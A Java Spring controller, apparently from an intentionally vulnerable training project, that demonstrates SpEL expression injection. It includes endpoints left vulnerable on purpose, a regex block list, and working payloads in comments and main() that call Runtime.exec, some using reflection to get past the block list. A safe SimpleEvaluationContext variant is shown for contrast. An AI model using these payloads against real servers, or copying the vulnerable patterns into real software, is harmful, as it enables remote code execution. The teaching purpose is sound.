package com.madaha.codesecone.controller.spel;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.expression.EvaluationContext;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.SimpleEvaluationContext;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * SpEL Injection（Spring 表达式）
 *
 * 需要审计的函数：
 *     1、SpelExpressionParser
 *     2、getValue
 */
@RestController
@RequestMapping("/SpEL")
public class SpEL {

    protected final Logger log =  LoggerFactory.getLogger(this.getClass());

    /**
     * @poc http://127.0.0.1:28888/SpEL/vul1?ex=T(java.lang.Runtime).getRuntime().exec(%27calc%27)
     *
     * @param ex
     * @return
     */
    @GetMapping("/vul1")
    public String vul1(String ex){
        ExpressionParser parser = new SpelExpressionParser();

        // StandardEvaluationContext 权限过大，可以执行任意代码，默认使用可以不指定
        // 注：这里使用了。
        EvaluationContext evaluationContext = new StandardEvaluationContext();
        Expression expression = parser.parseExpression(ex);

        String result = expression.getValue(evaluationContext).toString();
        log.info("[vul] SpEL");

        return result;
    }

    /**
     * @payload (需要url编码才能执行成功)
     *      http://127.0.0.1:28888/SpEL/vul2?ex=T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{'calc'})
     *
     * @poc http://127.0.0.1:28888/SpEL/vul2?ex=T%28String%29%2EgetClass%28%29%2EforName%28%22java%2El%22%2B%22ang%2ERu%22%2B%22ntime%22%29%2EgetMethod%28%22ex%22%2B%22ec%22%2CT%28String%5B%5D%29%29%2Einvoke%28T%28String%29%2EgetClass%28%29%2EforName%28%22java%2El%22%2B%22ang%2ERu%22%2B%22ntime%22%29%2EgetMethod%28%22getRu%22%2B%22ntime%22%29%2Einvoke%28T%28String%29%2EgetClass%28%29%2EforName%28%22java%2El%22%2B%22ang%2ERu%22%2B%22ntime%22%29%29%2Cnew%20String%5B%5D%7B%27calc%27%7D%29
     *
     * @param ex
     * @return
     */
    @GetMapping("/vul2")
    public String vul2(String ex){
        String[] black_list = {"java.+lang", "Runtime", "exec.*\\("};
        for (String s : black_list){
            Matcher matcher = Pattern.compile(s).matcher(ex);
            if (matcher.find()){
                return "黑名单过滤!";
            }
        }

        ExpressionParser parser = new SpelExpressionParser();

        // StandardEvaluationContext权限过大，可以执行任意代码，默认使用可以不指定。
        // EvaluationContext evaluationContext = new StandardEvaluationContext();
        Expression exp = parser.parseExpression(ex);

        String result = exp.getValue().toString();
        log.info("[vul] SpEL 黑名单绕过：" + ex);

        return result;
    }

    /**
     * @poc http://127.0.0.1:28888/SpEL/safe?ex=100*2
     *
     * @param ex
     * @return
     */
    @GetMapping("/safe")
    public String spelSafe(String ex){
        // SimpleEvaluationContext 旨在仅支持 SpEL 语句语法的一个子集。它不包括 Java 类型引用，构造函数和 bean 引用。
        ExpressionParser parser = new SpelExpressionParser();
        EvaluationContext simpleContext = SimpleEvaluationContext.forReadOnlyDataBinding().build();
        Expression exp = parser.parseExpression(ex);

        String result = exp.getValue(simpleContext).toString();
        log.info("[safe] SpEL");

        return result;
    }



    /**
     * Windwos 系统，本地测试。
     *
     * 测试通过，以下命令执行均可使用。
     */
    public static void main(String[] args) {
        // 算数运算
        String ex1 = "100*2";

        // 对象实例化
        String ex2 = "new java.util.Date().getTime()";
        String ex3 = "new java.lang.String('hello')";

        // T(Type): 使用"T(Type)"来表示java.lang.Class实例，同样，只有java.lang 下的类才可以省略包名
        // “calc” 的 ASCII 编码，到十进制格式为(To Decimal)：“99 97 108 99”。
        String ex4 = "T(java.lang.Runtime).getRuntime().exec('calc')";
        String ex5 = "T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))";

        // 利用反射绕过黑名单过滤
        String ex6 = "T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"calc\"})";
        String ex7 = "T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{'calc'})";

        ExpressionParser parser = new SpelExpressionParser();
        Expression exp = parser.parseExpression(ex5);
        System.out.println(exp.getValue());
    }


    /**
     * 本地测试（原作者是在 mac 系统的测试的，这里我是使用的 Windwos 系统平台。）
     */
//    public static void main(String[] args) {
//        // 算数运算
//        String ex1 = "100*2";
//
//        // 对象实例化
//        String ex2 = "new java.util.Date().getTime()";
//        String ex3 = "new java.lang.String('hello')";
//
//        // T(Type): 使用"T(Type)"来表示java.lang.Class实例，同样，只有java.lang 下的类才可以省略包名
//        String ex4 = "T(java.lang.Runtime).getRuntime().exec('open -a Calculator')";
//        String ex5 = "T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(111).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(114)))";
//
//        // 利用反射绕过黑名单过滤
//        String ex6 = "T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"open\",\"-a\",\"Calculator\"})";
//
//        ExpressionParser parser = new SpelExpressionParser();
//        Expression exp = parser.parseExpression(ex4);
//        System.out.println(exp.getValue());
//    }
}
